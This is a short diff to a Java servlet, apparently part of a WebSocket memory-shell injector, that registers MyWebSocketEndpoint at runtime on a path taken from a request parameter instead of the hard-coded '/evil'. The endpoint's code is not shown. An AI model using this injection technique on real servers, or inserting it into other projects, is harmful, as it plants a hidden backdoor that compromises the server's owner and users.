@@ -18,14 +18,14 @@ public class InjectWebsocket extends HttpServlet {
         String path = req.getParameter("path");
 
         if (path == null) {
-            path = "xx";
+            path = "/xx";
         }
 
         ServletContext sc = req.getServletContext();
         ServerContainer serverContainer =
                 (ServerContainer) sc.getAttribute("javax.websocket.server.ServerContainer");
         ServerEndpointConfig config = ServerEndpointConfig.Builder
-                .create(MyWebSocketEndpoint.class ,"/evil").build();
+                .create(MyWebSocketEndpoint.class ,path).build();
 
         try {
             serverContainer.addEndpoint(config);
